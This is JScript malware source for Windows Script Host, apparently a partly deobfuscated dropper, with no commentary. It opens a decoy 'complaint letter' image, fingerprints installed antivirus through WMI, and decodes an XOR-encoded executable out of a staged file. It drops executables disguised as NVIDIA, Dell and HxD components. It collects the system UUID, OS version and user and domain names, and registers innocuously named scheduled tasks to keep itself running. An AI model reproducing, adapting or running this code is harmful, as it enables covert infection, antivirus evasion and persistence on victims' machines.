(function() {
    function fDecodebase64() {
        try {
            e.GetFile(I).attributes = 128, e.DeleteFile(I)
        } catch (a) {}
    }

    function gDecodebase64(a, b) {
        for (var c = {
                8364: 128,
                8218: 130,
                402: 131,
                8222: 132,
                8230: 133,
                8224: 134,
                8225: 135,
                710: 136,
                8240: 137,
                352: 138,
                8249: 139,
                338: 140,
                381: 142,
                8216: 145,
                8217: 146,
                8220: 147,
                8221: 148,
                8226: 149,
                8211: 150,
                8212: 151,
                732: 152,
                8482: 153,
                353: 154,
                8250: 155,
                339: 156,
                382: 158,
                376: 159
            }, d = a.charCodeAt(0), g = a.slice(1, 1 + d), d = a.slice(1 + d + 4), e = [], h = 0; h < g.length; ++h) {
            var m = g.charCodeAt(h);
            c[m] && (m = c[m]);
            e.push(m)
        }
        for (var g = "", n = 0, z = h = 0; h < d.length; ++h,
            ++z) {
            var m = e[z % e.length],
                l = d.charCodeAt(h);
            c[l] && (l = c[l]);
            if (b && 60 == n && 255 == l && h + 3 < d.length) {
                var n = d.charCodeAt(h + 1),
                    p = d.charCodeAt(h + 2),
                    q = d.charCodeAt(h + 3);
                n == l && p == l && q == l && (l = 37, h += 3)
            }
            g += String.fromCharCode(l ^ m);
            n = l
        }
        return g
    }

    function R(a) {
        var b = WScript.CreateObject("ADODB.Stream");
        b.Type = 2;
        b.CharSet = "us-ascii";
        b.Open();
        b.WriteText(a);
        b.Position = 0;
        b.type = 1;
        a = b.Read;
        b.Close();
        b = WScript.CreateObject("MSXml2.DOMDocument").createElement("Base64Data");
        b.dataType = "bin.base64";
        b.nodeTypedValue = a;
        return b.text
    }

    function Decode(a) {
        var b = WScript.CreateObject("MSXml2.DOMDocument").createElement("Base64Data");
        b.dataType = "bin.base64";
        b.text = a;
        var c = WScript.CreateObject("ADODB.Stream");
        c.Type = 1;
        c.Open();
        c.Write(b.nodeTypedValue);
        c.Position = 0;
        c.type = 2;
        c.CharSet = "us-ascii";
        a = c.ReadText;
        c.Close();
        c = a.length;
        b = a.substring(c - 6);
        a = a.substring(0, c - 6);
        for (var c = "", d = 0; d < a.length; ++d) var g = a.charCodeAt(d),
            e = b.charCodeAt(d % b.length),
            g = String.fromCharCode(g ^ e),
            c = c + g;
        return c
    }

    function CheckWinDefender() {
        try {
            if (1 != p.length) return !1;
            for (var f =  "ows defe", b = 0; b < p.length; ++b)
                if (-1 != p[b].indexOf(f)) return !0
        } catch (c) {}
        return !1
    }

    function LoadFileToStream(a) {
        var b = new ActiveXObject("ADODB.Stream");
        b.Type = 2;
        b.CharSet = "iso-8859-1";
        b.Open();
        b.LoadFromFile(a);
        a = b.ReadText(-1);
        b.Close();
        return a
    }

    function T(f, b, c, d, g, e) {
        try {
            var h = WScript.CreateObject(ref_Schedule);
            h["Connect"]();
            var m = h["GetFolder"]("\\"),
            n = h["NewTask"](0),
            p = n["RegistrationInfo"];
            p.Description ="";
            p.Author = "";
            var l = n["Settings"];
            l["Enabled"] = !0;
            l["StartWhenAvailable"] = !0;
            l["Hidden"] = !1;
            l["DisallowStartIfOnBatteries"] = !1;
            l["StopIfGoingOnBatteries"] = !1;
            l["AllowHardTerminate"] = !1;
            l["ExecutionTimeLimit"] = "PT0S";
            var q = l["IdleSettings"];
            q["RestartOnIdle"] = !1;
            q["StopOnIdleEnd"] = !1;
            var r = n["Triggers"].Create(1),
                x = "StartBoundary",
                w = d.getDate().toString(),
                y = d.getFullYear().toString(),
                t = (d.getMonth() + 1).toString(),
                u = d.getHours().toString(),
                k = d.getMinutes().toString(),
                A = d.getSeconds().toString();
            2 > w.length && (w = "0" + w);
            2 > t.length && (t = "0" + t);
            2 > u.length && (u = "0" + u);
            2 > k.length && (k = "0" + k);
            2 > A.length && (A = "0" + A);
            r[x] = y + "-" + t + "-" + w + "T" + u + ":" + k + ":" + A;
            r["Enabled"] = !0;
            r["Repetition"]["Interval"] = g;
            var B = n.Actions.Create(0);
            B["Path"] = b;
            B["Arguments"] = f;
            B["WorkingDirectory"] = c;
            m["RegisterTaskDefinition"](e, n, 2, "", "", 3);
            return !0
        } catch (C) {}
        return !1
    }

    function WriteFileFromStream(a, b) {
        var c = new ActiveXObject("ADODB.Stream");
        c.Type = 2;
        c.CharSet = "iso-8859-1";
        c.Open();
        c.WriteText(b);
        c.SaveToFile(a, 2);
        c.Close()
    }

    function CheckPresent() {
        if (0 == r) 
        {
            try { e.FolderExists(t) && e.DeleteFolder(t,!0) } catch (b) {}
        }
        try { e.FolderExists(t) && e.DeleteFolder(t,!0) } catch (b) {}
        try {
            var f = e.GetParentFolderName(x);
            try {  e.FolderExists(f) || e.CreateFolder(f) } catch (b) {}
            e.FolderExists(x) || e.CreateFolder(x)
        } catch (b) {}
        if (0 == r) 
        {
            try {  e.CreateFolder(t) } catch (b) {}
            for (f = t + "\\" + "envQLOV0Y7.tmp";;)
            {
                try 
                {
                    e.CopyFile(WScript.ScriptFullName, f);
                    break
                } 
                catch (b) {}
            } 
            
        }
    }

    function K() {
        WScript.Sleep(GetRandomValue(29E3, 38E3));
        if (0 == r) try {
            e.FolderExists(t) && e.DeleteFolder(t, !0)
        } catch (H) {}
        tab["cRfwA"] = T;
        WScript.Sleep(GetRandomValue(27E3, 43E3));
        0 == r && (E = LoadFileToStream(I));
        ref_Schedule = "Schedule.Service";
        try {
            var f = E.length,
                b = f - parseInt("452688"),
                c = E.slice(b, f);
            WriteFileFromStream(V, gDecodebase64(c, !1));
            e.CopyFile(V, pa);
            WScript.Sleep(GetRandomValue(300, 600));
            e.DeleteFile(V);
            for (var d = "winmgmts:\\\\.\\root\\cimv2", g = GetObject(d), oa = "SELECT UUID FROM Win32_ComputerSystemProduct", h = g.ExecQuery(oa, "WQL", 48), m = new Enumerator(h), f = ""; !m.atEnd();) {
                f = m.item().UUID;
                break
            }
            if (f) {
                for (var m = 0, n = f.length, b = ""; m + 1 < n;) {
                    var z = (parseInt(f.substring(m, m + 2), 16) ^ 66).toString(16).toUpperCase();
                    2 > z.length && (z = "0" + z);
                    b += z;
                    m += 2;
                    if (m == n) break;
                    "-" == f.charAt(m) && (++m, b += "-")
                }
                C = encodeURIComponent(R(b))
            } else C = "";
            L = '"' + C + '"';
            for (var l = new Date, D = new Date(l.getTime() + 1E3 * GetRandomValue(35, 65)), n = x, z = qa, Q = W(ra, !0), J, w = "winmgmts:\\\\.\\root\\cimv2", K = GetObject(w), ReflocUserProfile = "SELECT Version FROM Win32_OperatingSystem", RefFilename = K.ExecQuery(N, "WQL", 48), k = new Enumerator(O), w = ""; !k.atEnd();) {
                w = k.item().Version;
                break
            }
            J = w ? encodeURIComponent(R(w)) : "";
            var A, B = objshell.ExpandEnvironmentStrings("%USERDOMAIN%"),
                P = objshell.ExpandEnvironmentStrings("%USERNAME%");
            A = W(B + "\\" + P, !0);
            var S = "HybridDrivesCacheRebalance",
                la ="PT3H30M",
                ma, k = '-p"yWYD0o" ',
                k = k + '-sp"';
            if (0 == r) k += '""' + C + '"" ', k += '""' + "dev" + M + ".tmp" + '"" ', k += '""' + Q + '"" ', k += '""' + J + '"" ', k += "0"+ " ", k += '""' + "D5B3556A"+ '"" ', k += '""' + A + '"" ';
            else {
                var Z = "GQK9AUH",
                    U = "tmp" + Z + ".dat",
                    B = C + " " + Q + " " + J + " " + "0"+ " " + "D5B3556A"+ " " + A,
                    na = e.CreateTextFile(x + "\\" + U, !0);
                na.Write(W(B, !1));
                na.Close();
                var aa = M.length.toString() + M + Z.length.toString() + Z, k = k + ("--R=" + aa)
            }
            ma = k + '"';
            q = [la, l, Q, J, A];
            T(ma, z, n, D, la, S);
            if (0 < q.length && DetectSpecAV())
                for (var F = q[1], G = q[2], l = [["%localappdata%\\DELL\\DellMobileConnect\\Dumps\\TechToolkit.exe", "%localappdata%\\DELL\\DellMobileConnect\\Dumps", "PropertyDefinitionSync","PT3H"], ["%appdata%\\Mael Horz\\HxD Hex Editor\\Logs\\nvapiu.exe", "%appdata%\\Mael Horz\\HxD Hex Editor\\Logs", "Schedule Defrag", "PT6H"]], D = 0; D < l.length; ++D) {
                    var v = l[D],
                        ba = v[0],
                        ca = v[1],
                        da = v[2],
                        ea = v[3],
                        ta = GetRandomValue(864E5, 6048E5),
                        ua = new Date(F.getTime() + ta);
                    T('"' + C + '" "' + M + '" "' + G + '" "' + q[3] + '" ' + "0"+ ' "' + "D5B3556A"+ '" "' + q[4] + '" 0', ba, ca, ua, ea, da)
                }
            if (q.length && (WScript["Sleep"](GetRandomValue(5E3, 12E3)), F = null, G = "", v = null, 0 != p.length && (v = q[1])) && (F = new Date(v.getTime() + 999 * GetRandomValue(365, 404)), v = "", null != F && null != e)) {
                v = "ScanForUpdate";
                G = va;
                L += " -f -t";
                var wa = G + "\\" + "RsnNotifier.exe";
                if (0 != v.length) tab["cRfwA"](L, wa, G, F, q[0], v)
            }
        } catch (H) {}
        0 == r && fDecodebase64()
    }

    function aDecodebase64(f) {
        try {
            E = LoadFileToStream(I);
            f = f.toLowerCase();
            f.substring(0, 4) == "c:\\w" && f.substring(f.length - 3) == "m32" && (objshell.CurrentDirectory = N);
            r && fDecodebase64();
            var b = parseInt("3445");
                c = parseInt("16374");
                d = E.slice(b, b + c);
            WriteFileFromStream(g, gDecodebase64(d, !0));
            WScript.Sleep(200);
            objshell.Run('"' + "ComplaintLetter030621.jpg" + '"', 1, 0)
        } catch (e) {}
    }

    function bDecodebase64() {
        var f = "";
        try {
            for (var b = "winmgmts:\\\\.\\root\\SecurityCenter", c = "AntiVirusProduct", d = GetObject(b), g = new Enumerator(d.InstancesOf(c)); !g.atEnd(); g.moveNext()) 
            {
                var e = g.item();
                h = e.displayName.toLowerCase();
                p.push(h);
                f += h + "|"
            } 
            d = GetObject("winmgmts:\\\\.\\root\\SecurityCenter2");
            for (g = new Enumerator(d.InstancesOf(c)); !g.atEnd(); g.moveNext()) {
                var e = g.item(),
                    h = e.displayName.toLowerCase(),
                    m;
                a: {
                    for (b = 0; b < p.length; ++b)
                    {
                        if (p[b] == h) 
                        {
                            m = !0;
                            break a
                        } m = !1
                    }
                        
                }
                m || (p.push(h), f += h + "|")
            }
            f = f.substring(0, f.length - 1)
        } catch (n) {}
        return f
    }

    function W(a, b) 
    {
        var c = "", d;
        d = "";
        for (var g = 0; 6 > g; ++g) d += "123456789".charAt(Math.floor(9 * Math.random()));
        for (g = 0; g < a.length; ++g) var e = a.charCodeAt(g),
            h = d.charCodeAt(g % d.length),
            e = String.fromCharCode(e ^ h),
            c = c + e;
        c = R(d + c);
        return b ? encodeURIComponent(c) : c
    }

    function DetectSpecAV() {
        try {
            if (0 == p.length) return !1;
            for (var f = "avast", b = "avg", c = 0; c < p.length; ++c) 
            {
                var d = p[c];
                if (-1 != d.indexOf(f) || -1 != d.indexOf(b)) return !0
            }
        } catch (e) {}
        return !1
    }

    function GetRandomValue(a, b) {  return Math.floor(Math.random() * (b + 1 - a)) + a }

    try {
        var objshell = new ActiveXObject("WScript.Shell"),
            p = [],
            RefFilename = "NvmMerger.exe",
            ReflocAppData = objshell.ExpandEnvironmentStrings("%appdata%"),
            tab = {},
            ReflocUserProfile = objshell.ExpandEnvironmentStrings("%userprofile%"),
            path = ReflocAppData + "\\Microsoft\\Windows\\Theme",
            t = path + "\\CachedFiles",
            L = null,
            va = "%appdata%" + "\\" + "QtProject\\Qt Creator\\bin",
            q = [],
            pa = path + "\\" + "NvmMerger.exe",
            E = null,
            qa = "%appdata%" + P + "\\" + "NvmMerger.exe",
            ra = bDecodebase64(),
            C = "",
            V = path + "\\" + "NvGpuUtilizations.exe",
            e = new ActiveXObject("Scripting.FileSystemObject"),
            ref_Schedule = null,
            I = ReflocUserProfile + "\\" + "file.tmp",
            r = CheckWinDefender(),
            M = "414J6Z";
        if (-1 != WScript.ScriptFullName.indexOf("envQLOV0Y7.tmp")) K();
        else if (aDecodebase64(objshell.CurrentDirectory), CheckPresent(), e.DeleteFile(WScript.ScriptFullName), 0 == r) {
            var da = t + "\\" + "envQLOV0Y7.tmp",
                Args = '"Cscript "//E:JScript""' + ' "' + da + '"';
                objshell.Run(Args, 0, 0)
        } else K()
    } catch (f) {}
})();
